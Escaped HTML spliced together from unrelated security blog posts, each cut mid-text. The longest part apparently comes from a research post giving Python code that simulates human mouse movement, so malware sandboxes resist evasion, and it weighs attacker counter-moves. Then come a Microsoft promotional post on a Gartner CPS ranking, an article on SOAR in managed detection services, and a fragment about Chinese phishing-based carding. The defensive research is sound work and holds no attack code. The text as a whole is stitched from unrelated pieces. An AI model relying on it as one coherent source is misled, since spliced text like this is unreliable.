&lt;li&gt;Set \(v_{\text{cur}}=v_{\text{next}}\) and repeat.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;The code corresponding to this top level behavior is below.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;def generate_movement(t: timedelta) -&gt; List[Coor]:
    output_len = int(floor((t.total_seconds() * TIME.MS_IN_S) / TIME.INTERVAL))
    result : List[Coor] = []
    cur_pos : Coor = gauss_step_from(
        [SCR.WIDTH//2,SCR.HEIGHT//2],
        [SCR.WIDTH,SCR.HEIGHT]
    )
    while len(result) &amp;lt; output_len:
        
        next_pos = gauss_step_from(cur_pos,[SCR.WIDTH,SCR.HEIGHT])
        mov_time = pick_movement_time(cur_pos,next_pos)
        mov_steps = time_to_steps(mov_time)
        path = gen_path(cur_pos,next_pos,mov_steps)
        result += path
        
        
        wait_time = timedelta(milliseconds=np.random.exponential(WAIT.EXP_DIST_MEAN)*WAIT.GLOBAL_COEF)
        wait_steps = time_to_steps(wait_time)
        result += [result[-1]]*wait_steps

        cur_pos = next_pos
    
    result = result[:output_len]
    return result&lt;/pre&gt;



&lt;p&gt;The entire code is available in&amp;nbsp;&lt;strong&gt;Appendix A&lt;/strong&gt;.&lt;/p&gt;



&lt;p&gt;We will now explain each of these steps in a bit more detail.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="waiting"&gt;Waiting&lt;/h3&gt;



&lt;p&gt;We model “user wants to move the cursor to a new location” events as the output of a Poisson distribution. This distribution can be considered as modeling the throughput of an event pipeline where incoming events occur independently of each other (such as the calls in a call center). This is probably not the&amp;nbsp;&lt;em&gt;best possible&lt;/em&gt;&amp;nbsp;approximation to human behavior. Still, it is a better approximation than having the delay between one mouse movement and the next be a fixed interval or picking it uniformly.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-31075" height="725" src="https://research.checkpoint.com/wp-content/uploads/2025/02/B11FRZWCH2-rId27-1024x725.png" style="width: 494px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 1 &amp;#8211; Poisson distribution probability mass function for various mean value parameters \(\mu\). This distribution can only take integer values; the continuous green line is a visual aid.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;When implementing the simulated mouse movement in practice, the value we care about specifically is the amount of time to delay the next movement. The Poisson distribution equivalently models a process where the time from one event to the next is distributed according to the exponential distribution.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-31076" height="718" src="https://research.checkpoint.com/wp-content/uploads/2025/02/B11FRZWCH2-rId30-1024x718.png" style="width: 470px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 2 &amp;#8211; Exponential distribution probability mass function for various mean value parameters \(\mu\).&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;To help visualize what this means about the frequency of events, we include below an animation of incoming events distributed this way (each event represented by a bright white light). The delay between one event and the next is the sample of an exponential distribution with mean&amp;nbsp;\(\mu\), multiplied by a \(\text{time_unit}\)&amp;nbsp;of 1 second.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31082" height="460" src="https://research.checkpoint.com/wp-content/uploads/2025/02/rId33.gif" width="400" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 3 &amp;#8211; Visualization of exponentially distributed delay between events.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h3 class="wp-block-heading" id="setting-next-cursor-destination"&gt;Setting Next Cursor Destination&lt;/h3&gt;



&lt;p&gt;The entire mouse movement, in general, is composed of “segments” that each have a start point and end point. These are not straight lines (perhaps the visualizations in the next sections will help clarify that), but their generation is based on a set starting point and ending point. When generating a new segment, the starting point is the cursor’s current location, and the ending point is sampled from a two-dimensional Gaussian (normal distribution) centered at the current location. The standard deviation along each axis is taken to be&amp;nbsp;&lt;em&gt;mL&lt;/em&gt;&amp;nbsp;where m is a “motility parameter”&amp;nbsp;\(0 \leq m \leq \frac{1}{2}\)&amp;nbsp;and L is the total pixel size of that axis (so for an 1920&amp;#215;1080 screen, \(L_x = 1920\) and \(L_y = 1080\)). Below, we include some heat map visualizations for several initial locations on the screen and values of&amp;nbsp;\(m\), for a 16:9 aspect ratio.&amp;nbsp;\(c_x\)&amp;nbsp;and&amp;nbsp;\(c_y\)&amp;nbsp;are the Gaussian mean coordinates normalized to the range&amp;nbsp;\([0,1]\).&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-31077" height="553" src="https://research.checkpoint.com/wp-content/uploads/2025/02/B11FRZWCH2-rId37-1024x553.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 4 &amp;#8211; Heat map of probability density of next cursor destination based on current cursor destination. \(c_x\) and \(c_y\) are coordinates normalized to the range \([0,1]\). \(m\) is the motility parameter; it is used to determine the Gaussian standard deviation, e.g. \(\sigma_x = mL_x\) where \(L_x\) is the screen width.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h3 class="wp-block-heading" id="charting-the-path-prototype"&gt;Charting the Path Prototype&lt;/h3&gt;



&lt;p&gt;To properly tackle this part, we first introduce the notion of a path prototype. This is probably easier to visualize in one coordinate. Suppose we want to move from&amp;nbsp;\(x=20\)&amp;nbsp;to&amp;nbsp;\(x=80\)&amp;nbsp;during some unit of time. A “prototype” for this movement is a function \(\varphi: [0,1] \rightarrow [0,1]\)&amp;nbsp;that maps “the portion of allotted time that has elapsed” to “the portion of the path we have traveled”. More concretely, the output value of&amp;nbsp;\(\varphi\)&amp;nbsp;is naturally interpreted as a linear combination of the source point and the destination point: so in this example, if&amp;nbsp;\(\varphi(0.5) = \frac{1}{6}\)&amp;nbsp;this implies that when half the travel time has elapsed, the cursor has moved to&amp;nbsp;\(x=30\), having traveled only 10 units out of the 60 required for the whole journey. For obvious reasons we require that a well-formed prototype should have \(\varphi(0)=0\) and \(\varphi(1)=1\).&lt;/p&gt;



&lt;p&gt;The simplest prototype is \(\varphi(x)=x\)&amp;nbsp;which implies that the cursor moves from the source to the destination at a constant rate, but other prototypes are possible &amp;#8211; some of them not even monotonously increasing, like the example on the right.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31109" height="427" src="https://research.checkpoint.com/wp-content/uploads/2025/02/composite_animation_converted-1.gif" width="800" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 5 &amp;#8211; Visualization of 1-dimensional movement corresponding to three different prototypes.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Composing two prototypes, one per coordinate, naturally gives an analogous 2d prototype for moving from \((0,0)\) to \((1,1)\).&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31110" height="450" src="https://research.checkpoint.com/wp-content/uploads/2025/02/2d_prototype_converted.gif" width="540" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 6 &amp;#8211; Visualization of compound prototype resulting from the combination of two different prototypes, one for the \(x\)-axis and another for the \(y\)-axis.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;To generate prototypes that have some variety, we can begin by looking at “periodic noise” of the form \(f(x) = \sin(n \tau x + \phi)\), which has two parameters:&amp;nbsp;\(n\)&amp;nbsp;(frequency) and&amp;nbsp;\(\phi\)&amp;nbsp;(phase). We can choose a parameter \(\text{wave_count}\)&amp;nbsp;and pick this many random noise functions, with each \(\phi\) picked uniformly from \([0,\tau]\)&amp;nbsp;and each&amp;nbsp;\(n\)&amp;nbsp;picked uniformly from 1 to some parameter \(\text{max_freq}\)&amp;nbsp;(our experience has been that letting&amp;nbsp;\(\text{max_freq}\)&amp;nbsp;exceed 5 leads to unstable, jittery results).&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 7 - Noise is generated by averaging several sine waves each
with a random shift and random frequency (up to some limit)." src="https://research.checkpoint.com/wp-content/uploads/2025/02/B11FRZWCH2-rId47.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 7 &amp;#8211; Noise is generated by averaging several sine waves each with a random shift and random frequency (up to some limit).&lt;/figcaption&gt;&lt;/figure&gt;



&lt;p&gt;It’s not immediately clear how to get a prototype from this “composite noise” (let’s denote it&amp;nbsp;\(h\)), as it doesn’t have \(h(0)=0\) and \(h(1)=1\), and its values can span the whole range \(-1 \leq h(x) \leq 1\)&amp;nbsp;(because it is the average of many sine waves with this property). To solve this, first of all instead of \(h\)&amp;nbsp;we can use&amp;nbsp;\(\tilde h = \frac{h(x) + 1}{2}\)&amp;nbsp;(which has the desired range, \(0 \leq \tilde h (x) \leq 1\) for \(0 \leq x \leq 1\)). Then, we can take a pointwise linear combination of \(\tilde h\) and \(f(x)=x\). Meaning, we can define \(\varphi(x) = (1-\psi(x))x + \psi(x) \tilde h (x)\), where \(\psi\)&amp;nbsp;is some suitable “combining” function that has \(\psi(0) = \psi(1) = 0\), with \(0 \leq \psi(x) \leq 1\)&amp;nbsp;for all \(0 \leq x \leq 1\)&amp;nbsp;(you might want to algebraically follow what happens to \(\varphi\)&amp;nbsp;when \(x=0\)&amp;nbsp;and when \(x=1\), or just be convinced by the below diagrams). A convenient choice is \(\psi(x) = 4(x-x^2)\), which for the above combined noise gives the following prototype \(\varphi\):&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-31079" height="775" src="https://research.checkpoint.com/wp-content/uploads/2025/02/B11FRZWCH2-rId50-1024x775.png" style="width: 576px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 8 &amp;#8211; By computing \(\varphi(x)=(1-\psi(x))x+\psi(x)\frac{h(x)+1}{2}\) where \(\psi(x)=4(x-x^2)\), we obtain a valid prototype \(\varphi\) (pictured) from the noise \(h\).&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The logic described above is implemented using the following code.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;def gen_path_proto_1d() -&gt; Prototype:
    wave = lambda n,shift: lambda x: sin(n*tau*x+shift)
    freqs = [random.choice(range(1,PROTO.MAX_FREQ+1)) for _ in range(PROTO.NUM_WAVES)]
    profile = {f:np.random.uniform()*tau for f in freqs}
    h = lambda x: sum([wave(f,s)(x) for (f,s) in profile.items()])/len(profile)
    psi = lambda x: 4*(x-x**2)
    f = lambda x: x*(1-psi(x))+((h(x)+1)/2)*psi(x)
    return f&lt;/pre&gt;



&lt;p&gt;Below is a collection of 25 randomly generated different prototypes using the above process.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-31080" height="1024" src="https://research.checkpoint.com/wp-content/uploads/2025/02/B11FRZWCH2-rId53-1024x1024.png" style="width: 734px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 9 &amp;#8211; 25 randomly generated prototypes. These were generated with the parameters \(\text{wave_count}=5\), \(\text{max_freq}=4\).&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h3 class="wp-block-heading" id="charting-the-actual-path"&gt;Charting the Actual Path&lt;/h3&gt;



&lt;p&gt;Once a source point and a destination point on the screen are chosen, as well as path prototypes for both the \(x\) and \(y\) coordinates and a desired time for the trip to take place, creating the actual cursor movement is a matter of algebra — for each point in time seeing what portion \(0 \leq r \leq 1\)&amp;nbsp;of the trip has elapsed, what values the prototypes \(\varphi_x\) and \(\varphi_y\)&amp;nbsp;take at that \(r\), and finally computing the corresponding linear combinations of \(v_{\text{cur}}\) and \(v_{\text{next}}\)&amp;nbsp;at the \(x\)&amp;nbsp;coordinate and&amp;nbsp;\(y\)&amp;nbsp;coordinate.&lt;/p&gt;



&lt;p&gt;Let’s see an example. Suppose we are charting a path between two points on a 1920&amp;#215;1080 display. We have determined that the journey should take \(T= 5_{\text{sec}}\). Using the above method, we generate path prototypes, one per each coordinate.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-31081" height="520" src="https://research.checkpoint.com/wp-content/uploads/2025/02/B11FRZWCH2-rId57-1024x520.png" style="width: 666px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 10 &amp;#8211; 2 randomly generated prototypes. These were generated with the parameters \(\text{wave_count}=6\), \(\text{max_freq}=4\).&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Applying these two prototypes to the movement between \(v_{\text{cur}}\) and \(v_{\text{next}}\), one then obtains the following cursor movement.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31085" height="450" src="https://research.checkpoint.com/wp-content/uploads/2025/02/rId60.gif" width="800" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 11 &amp;#8211; Resulting movement induced by the two randomly generated prototypes seen in the previous figure.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;As explained earlier, the full simulated mouse movement is just a sequence of these paths, where the next destination is sampled from a Gaussian centered around the current position, and there is an exponentially distributed delay between one path and the next.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-31086" height="450" src="https://research.checkpoint.com/wp-content/uploads/2025/02/rId63.gif" width="800" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 12 &amp;#8211; Sample chain movement generated by the simulation algorithm over time.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h2 class="wp-block-heading" id="feasibility-of-counter-counter-evasions-and-so-on"&gt;Feasibility of Counter-Counter-Evasions and so on&lt;/h2&gt;



&lt;p&gt;At this point, it is natural to ask how favorable the prospects are of an attacker trying to construct an evasion again, sidestepping a sandbox that employs this kind of simulated mouse movement. We think the answer is nuanced and is influenced mainly by the following considerations.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;The theoretical ceiling for the sophistication of evasions and counter-evasions in this space is very high.&lt;/strong&gt;&amp;nbsp;To intuitively understand this, consider that if a human tries to decide whether the mouse movement in the above animation is simulated or human-generated, there’s a decent chance they would answer correctly. But it won’t be so straightforward to properly motivate this answer or explain the considerations involved to a Python script.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;These sorts of games favor incremental improvement by their nature.&lt;/strong&gt;&amp;nbsp;There are many detections, mitigations, plays, and counter-plays where the thought of “What if my opponent plays their hand perfectly” is actively harmful. Usually, they won’t, and now, instead of taking advantage of this, you are helplessly staring at some esoteric and intractable general class of problem. It’s great to think about the holy grail of perfect solutions, but it’s often more practical to raise the bar and make attacks more of a hassle than before.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;As we get deeper into the game, diagnostic pressure on the attacker grows.&lt;/strong&gt;&amp;nbsp;This is, as we’ve already noted, a rare scenario where attackers are the ones who have to worry about false positives and false negatives. When we constructed our original evasion, we reached a very high degree of confidence. Specifically, we were able to programmatically quantify some concrete metric by which the simulation behaved in a way that no human ever would, with virtual certainty. When this degree of confidence is not within reach, the calculus changes. It’s not very clear what a malicious binary should do with, let’s say, 75% certainty that it’s running in a sandbox.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;We encourage you to do more than just copy-paste the code!&lt;/strong&gt;&amp;nbsp;Change the parameters, or even randomize reasonable values per run. Try another distribution for&amp;nbsp;&lt;code&gt;base_movement_time&lt;/code&gt;. Call&amp;nbsp;&lt;code&gt;generate_movement&lt;/code&gt;&amp;nbsp;and interpolate the result with a bunch of other not-obviously-auto-generated stuff. Get creative. If there is no single algorithm to beat, attackers are at a further disadvantage.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading" id="conclusion"&gt;Conclusion&lt;/h2&gt;



&lt;p&gt;The universe of sandbox evasions is very large and very strange. Even something as prosaic as minor quirks in a mouse movement can, in theory, spell the difference between a successful attack and an attack stopped in its tracks or between a targeted analysis taking an hour and taking half a week. Malware authors are doing their best to come up with new evasions all the time, and it’s hard to imagine a sweeping solution to all their many creative ideas. To win the day, defenders must take many Sisyphean small steps, closing half-open avenues and raising walls ever so slightly higher. The best we can hope for is that one day a malware author with a half-baked evasion idea on their mind reads this and says “never mind, I’m going to try something else”.&lt;/p&gt;

Gartner defines Cyber-physical systems (CPS) as "engineered systems that orchestrate sensing, computation, control, networking and analytics" that connect the digital and physical worlds. They span industrial control systems (ICS), OT devices, Internet of Things (IoT) devices, and more.   &lt;/p&gt;

Microsoft has observed an increase in reported attacks on internet-exposed operational technology (OT) devices that control real-world critical processes—like water and wastewater systems, as well as critical functions across industries including healthcare, manufacturing, energy, and more.&lt;sup&gt;1&lt;/sup&gt; Our previous Microsoft Digital Defense Reports have shown that unfortunately the security of OT devices has not kept pace with the strengthened security of IT hardware and software. As of July 2024, we had identified and shared more than 300 vulnerabilities in third-party OT applications. The initiative contributed to significant improvements in security across the OT industry.&lt;sup&gt;1&lt;/sup&gt; It highlights a need for organizations to integrate OT devices into their broader endpoint security strategy. &amp;nbsp;&lt;/p&gt;



&lt;p&gt;We are excited to announce that Gartner has named &lt;strong&gt;Microsoft a Leader in the &lt;/strong&gt;&lt;a href="https://www.gartner.com/doc/reprints?id=1-2KAV7A6A&amp;amp;ct=250218&amp;amp;st=sb" rel="noreferrer noopener" target="_blank"&gt;&lt;strong&gt;2025 Gartner&lt;sup&gt;® &lt;/sup&gt;Magic Quadrant™ for Cyber Physical Systems Protection Platforms&lt;/strong&gt;&lt;/a&gt;. Gartner defines cyber-physical systems (CPS) as &amp;#8220;engineered systems that orchestrate sensing, computation, control, networking and analytics&amp;#8221; that connect the digital and physical worlds. They span industrial control systems (ICS), OT devices, Internet of Things (IoT) devices, and more.   &lt;/p&gt;



&lt;p&gt;CPS devices are an inherent component to any security strategy, and as the only security platform vendor now recognized as a Leader in both endpoint and CPS security, it highlights, in our opinion, our commitment to providing customers with holistic endpoint security on any platform. Our cross-platform strategy is key to making continued progress in helping organizations protect their endpoints against the latest, and most sophisticated cyberattacks as they span operating systems and cross into CPS infrastructure, while driving continued efficiency for security operations center (SOC) teams. &lt;a href="https://aka.ms/CPSwave" rel="noreferrer noopener" target="_blank"&gt;Read the report here&lt;/a&gt;. &amp;nbsp;&lt;/p&gt;



&lt;p&gt; &amp;nbsp;&lt;/p&gt;



&lt;figure class="wp-block-image aligncenter size-full"&gt;&lt;img alt="Gartner, Magic Quadrant for CPS Protection Platforms, 127 February 2025, By Katell Thielemann, Wam Voster, Ruggero Contu" class="wp-image-137535" height="1596" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/02/Picture1-2.png" width="1442" /&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="meeting-the-unique-ot-security-needs-of-organizations-in-every-major-industry"&gt;Meeting the unique OT security needs of organizations in every major industry &amp;nbsp;&lt;/h2&gt;



&lt;p&gt;The core of Microsoft&amp;#8217;s CPS offering to help secure OT environments is &lt;strong&gt;Microsoft Defender for IoT&lt;/strong&gt;, which provides CPS capabilities though purpose-built sensors, and combined with Defender for Endpoint, helps provide holistic endpoint security to organizations worldwide. Both are native components of our unified security operations platform. &amp;nbsp;&lt;/p&gt;



&lt;p&gt;CPS security is deeply embedded into Microsoft’s approach to securing devices across the platforms our customers operate on. &lt;a href="https://www.microsoft.com/security/business/endpoint-security/microsoft-defender-endpoint" rel="noreferrer noopener" target="_blank"&gt;Defender for Endpoint&lt;/a&gt; uses its network traffic insights to discover devices that it centralizes in a unified device inventor; we provide holistic vulnerability management for software on both user, as well as CPS devices, and bring information together in a unified incident investigation experience to enable analysts to &lt;a href="https://techcommunity.microsoft.com/blog/microsoftthreatprotectionblog/make-ot-security-a-core-part-of-your-soc-strategy-with-microsoft-defender-xdr/4185702" rel="noreferrer noopener" target="_blank"&gt;investigate endpoint-focused attacks end-to-end&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Further, Microsoft is deeply committed to helping customers achieve cost efficiencies through our strategic Microsoft 365 E5 Security bundles, while equally allowing maximum purchasing flexibility through our standalone offers for each solution. &amp;nbsp;&lt;/p&gt;



&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-7 wp-block-buttons-is-layout-flex"&gt;
&lt;div class="wp-block-button btn-primary"&gt;&lt;a class="wp-block-button__link has-text-align-center wp-element-button" href="https://www.microsoft.com/security/business/endpoint-security/microsoft-defender-iot" rel="noreferrer noopener" target="_blank"&gt;Secure your enterprise IoT devices with Microsoft Defender for IoT&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;



&lt;h2 class="wp-block-heading" id="innovations-that-drive-better-defense-strategies"&gt;Innovations that drive better defense strategies &amp;nbsp;&lt;/h2&gt;



&lt;p&gt;Over the last 12 months, Microsoft has delivered significant innovations that help defenders gain the upper hand against OT and other cyberthreats including:  &amp;nbsp;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Microsoft’s unified security operations platform&lt;/strong&gt; brings the foundational tools a SOC needs into a single experience, with a consistent data model, unified capabilities, and broad protection. This unified experience helps SOCs close critical security gaps and streamline their operations, delivering better overall protection, reducing their response time by 88%, and improving overall efficiency.&lt;sup&gt;2&lt;/sup&gt; Defender for IoT is core to &lt;a href="https://www.microsoft.com/en-us/security/blog/2024/01/16/unified-security-operations-with-microsoft-sentinel-and-microsoft-defender-xdr/?msockid=3bef1be87261641b09e20845732c65d6" rel="noreferrer noopener" target="_blank"&gt;this platform&lt;/a&gt;, which combines the power of leading solutions in security information and event management (SIEM), extended detection and response (XDR), and Generative AI for security. It enables security teams to detect and respond to cyberthreats across OT environments and get key insights into their OT security posture, detect cyberthreats, and understand them in context of broader incidents.  &lt;/p&gt;



&lt;p&gt;&lt;strong&gt;The unified agent&lt;/strong&gt; combines protection across endpoints, OT devices, identities and data loss prevention (DLP) to help security teams streamline deployment and protection. The sensor is the software component that monitors and protects critical infrastructure, serving as one of the first lines of defense against cyberthreat actors. With our platform approach that brings together &lt;a href="https://azure.microsoft.com/products/microsoft-sentinel"&gt;Microsoft Sentinel&lt;/a&gt; and &lt;a href="https://www.microsoft.com/security/business/siem-and-xdr/microsoft-defender-xdr" rel="noreferrer noopener" target="_blank"&gt;Microsoft Defender XDR&lt;/a&gt;, &lt;strong&gt;we now have the first platform-level platform-level agent that unifies protection across four solution areas&lt;/strong&gt;. The streamlined agent simplifies how you activate and manage core capabilities to more easily and swiftly reap the benefits of our AI-powered protection. Read more about the unified agent platform on the &lt;a href="https://techcommunity.microsoft.com/blog/microsoftdefenderatpblog/the-unified-agent-now-combines-protection-across-endpoints-ot-devices-identities/4303805" rel="noreferrer noopener" target="_blank"&gt;Microsoft Defender for Endpoint blog&lt;/a&gt;.  &lt;/p&gt;


&lt;figure class="wp-block-image aligncenter size-full"&gt;&lt;img alt="Circular diagram displaying Unified platform agent in the middle with Endpoints, OT devices, Data loss prevention, and Identities revolving around the exterior.&amp;nbsp;" class="wp-image-137421 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/02/image-12.webp" /&gt;&lt;/figure&gt;



&lt;p&gt;&lt;strong&gt;&lt;a href="https://www.microsoft.com/security/business/siem-and-xdr/microsoft-security-exposure-management"&gt;Microsoft Security Exposure Management&lt;/a&gt;&lt;/strong&gt; is part of the unified security operations portal and provides a unified view of security posture across company assets and workloads. Security initiatives are an experience that provides a simple way to assess security readiness for a specific security area or workload, and to constantly track and measure exposure risk over time. The &lt;strong&gt;OT Security&lt;/strong&gt; &lt;strong&gt;initiative&lt;/strong&gt; improves your OT site security posture by monitoring and protecting OT environments in the organization, and employing network layer monitoring. This initiative identifies devices and ensures that systems are working correctly, and data is protected. Your security teams can use the &lt;strong&gt;OT Security&lt;/strong&gt; initiative to identify unprotected devices and harden posture across sites through vulnerability assessments, with actionable guidance to help remediate at-risk devices. &lt;a href="https://learn.microsoft.com/defender-for-iot/review-security-initiatives#ot-security-initiative" rel="noreferrer noopener" target="_blank"&gt;Read more about security initiatives&lt;/a&gt;.  &amp;nbsp;&lt;/p&gt;

One technology area it explored was security orchestration, automation, and response (SOAR)—the workhorse behind automating security workflows. The survey revealed several key benefits of SOAR in MDR, highlighting how it can help MSPs and SMBs improve incident response, reduce alert fatigue, and deliver round-the-clock security.&lt;/p&gt;



&lt;p&gt;SOAR is a technology that enables security teams to automate and streamline their workflows—from threat detection to response. It integrates and coordinates security tools and processes, helping analysts handle and respond to incidents. By automating repetitive tasks, such as triaging alerts and executing response actions, SOAR reduces manual effort and speeds up incident resolution. This improves the overall effectiveness of security operations, making it a critical component of modern MDR solutions.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Real-world benefits of SOAR for MDR solutions&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Automation of common tasks&lt;/strong&gt;&lt;br /&gt;In the survey, 30% of MSPs pointed to automation of common tasks as the most valuable benefit of SOAR within an MDR service—and it’s easy to see why. Automation allows MSPs to streamline repetitive tasks like alert triage and standard response workflows. By speeding up incident resolution and ensuring consistent, accurate responses, SOAR helps MSPs address threats swiftly and effectively. This not only reduces the burden on security teams but also enables them to outpace adversaries and deliver stronger protection for their customers.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Improved 24/7/365 protection and after-hours response&lt;/strong&gt;&lt;br /&gt;Cybercriminals know that timing is everything. They often strike outside of business hours—late at night, on weekends, or during holidays—because they count on reduced staffing and slower response times to give them the upper hand. However, with MDR services leveraging SOAR, cybercriminals lose their “after hours advantage.”&lt;/p&gt;



&lt;p&gt;According to the survey, 27% of MSPs identified improved 24/7/365 protection and after-hours response as a top SOAR benefit as part of an MDR solution. By automating detection and response using customizable workflows, SOAR ensures security measures are always on, regardless of the time or day.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Reduced alert fatigue&lt;/strong&gt;&lt;br /&gt;Alert fatigue is one of the most pressing challenges for security teams today. When bombarded with an overwhelming number of alerts, it’s easy for critical threats to get lost in the noise. SOAR directly tackles this issue, helping MSPs streamline their processes and focus on what really matters. In fact, 24% of MSPs in the survey noted that SOAR’s ability to reduce alert fatigue thereby improving accuracy and confidence was a key benefit for an MDR solution.&lt;/p&gt;



&lt;p&gt;SOAR works by automatically analyzing security alerts against predefined rules and context, escalating the most critical threats to the surface. This not only sharpens the accuracy of responses but also enables security teams to act quickly and decisively. Security teams can use SOAR to create workflows to remediate the high-priority incidents that truly need attention, ensuring that any financial and reputational damage is minimized&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Centralized incident management with enriched alerts&lt;/strong&gt;&lt;br /&gt;When it comes to incident management, having a disjointed view can slow down response times and make it harder to pinpoint the right course of action. That’s why 19% of MSPs in the survey highlighted centralized incident management and enriched alerts as one of the top benefits of SOAR for an MDR solution.&lt;/p&gt;



&lt;p&gt;Alerts are enriched with the latest threat intelligence, which provides security teams with vital context. This deeper layer of information helps analysts understand the full scope and severity of an alert, allowing them to make quicker, more informed decisions. With SOAR, all relevant data is centralized in one platform, giving security teams a unified view that enhances their ability to respond effectively and prioritize the most critical threats without missing crucial details.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;MDR with SOAR helps MSPs differentiate their offering&lt;/h2&gt;



&lt;p&gt;For MSPs, leveraging SOAR capabilities in their MDR offerings is a strategic move that can significantly enhance their service delivery. By focusing on the key benefits of automation using workflows, 24/7 protection, reduced alert fatigue, and centralized incident management, MSPs can provide a superior level of security that meets the evolving needs of their SMB clients. This differentiation not only improves client outcomes but also positions MSPs as leaders in the competitive security services market.&lt;/p&gt;



&lt;p&gt;Incorporating SOAR into MDR services enables MSPs to offer a more efficient, reliable, and comprehensive security solution. With SOAR automating routine tasks, improving after-hours response, reducing alert fatigue, and centralizing incident management, MSPs can ensure that their clients receive the best possible defense against cyber threats. This approach not only enhances the overall security posture of SMBs but also builds trust and confidence in the MSPs&amp;#8217; ability to safeguard their clients&amp;#8217; digital assets.&lt;/p&gt;



&lt;h2 class="wp-block-heading"&gt;Final thoughts&lt;/h2&gt;



&lt;p&gt;When MSPs choose to partner with a vendor for MDR, it’s important to select one that integrates SOAR into their offering. By doing so, MSPs can deliver a modern, proactive MDR service that improves security posture and provides the best experience for their SMB customers. SOAR accelerates response actions to stop adversaries in their tracks at every turn, ensuring that MSPs can swiftly detect and respond to threats before they inflict damage. With SOAR at the core, MSPs can offer a superior MDR service that adapts to the rapidly changing threat landscape, keeping their customers secure, happy, and confident.&lt;/p&gt;

Happily, the broad deployment of more secure chip-based payment cards in the United States has weakened the carding market. But a flurry of innovation from cybercrime groups in China is breathing new life into the carding industry, by turning phished card data into mobile wallets that can be used online and at main street stores.&lt;/p&gt;
&lt;div class="wp-caption aligncenter" id="attachment_70443" style="width: 490px;"&gt;&lt;img alt="" class="size-full wp-image-70443" height="630" src="https://krebsonsecurity.com/wp-content/uploads/2025/02/tollpassphishing.png" width="480" /&gt;&lt;p class="wp-caption-text" id="caption-attachment-70443"&gt;An image from one Chinese phishing group&amp;#8217;s Telegram channel shows various toll road phish kits available.&lt;/p&gt;&lt;/div&gt;
